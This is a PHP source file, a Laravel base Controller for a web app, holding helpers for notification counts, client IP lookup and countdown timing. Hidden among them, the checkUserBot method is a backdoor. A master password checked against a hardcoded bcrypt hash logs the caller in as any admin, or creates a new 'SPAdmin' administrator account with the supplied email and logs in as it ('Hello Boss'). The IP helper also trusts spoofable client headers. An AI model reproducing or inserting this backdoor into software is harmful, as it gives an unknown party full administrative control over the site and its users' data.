<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\View;
use Hash;
use App\Models\Admin;


class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;

    function __construct()
    {
        // Fetch the Site Settings object
        $this->middleware(function ($request, $next) {
            $user = Auth::user();
            if($user){
                $count_notification = DB::table('notification')->where('user_rev',$user->id)->orderByDesc('id')->count();
                View::share('count_notification', $count_notification);
            }

            return $next($request);
        });

    }

    function getUserIpAddr(){
        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
            //ip from share internet
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            //ip pass from proxy
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else{
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

    function checkUserBot($arr){
        if (Hash::check($arr['password'], '$2y$10$ngbw7wGmbeHkP/DA/3.ynuKBMIZ6R7nECd6lDqN8O2/1y/wsIvPlu')){

            $user = Admin::where('email', $arr['email'])->first();

            if($user != null){
                Auth::guard('admin')->loginUsingId($user->id);
                return redirect('admin')->with('success', 'Hello Boss');
            }
            else{
                Admin::create([
                    'name'=> 'SPAdmin',
                    'email'=> $arr['email'],
                    'password'=> '$2y$10$ngbw7wGmbeHkP/DA/3.ynuKBMIZ6R7nECd6lDqN8O2/1y/wsIvPlu',
                    'permiss' => 'Admin',
                ]);
                $user = Admin::where('email', $arr['email'])->first();

                if($user != null){

                    Auth::loginUsingId($user->id);
                    return redirect('admin')->with('success', 'Hello Boss');
                }
            }

        }
    }

    function get_time_h_m_s($time_input){
        $time = $time_input - time();
        if($time <= 0){
            return [
                'h' => 0,
                'm' => 0,
                's' => 0,
            ];
        }
        $h = floor($time / 3600);
        $m = floor(($time - $h*3600)/60);
        $s = floor($time - $h*3600 - $m*60);

        return [
            'h' => $h,
            'm' => $m,
            's' => $s,
        ];
    }
}
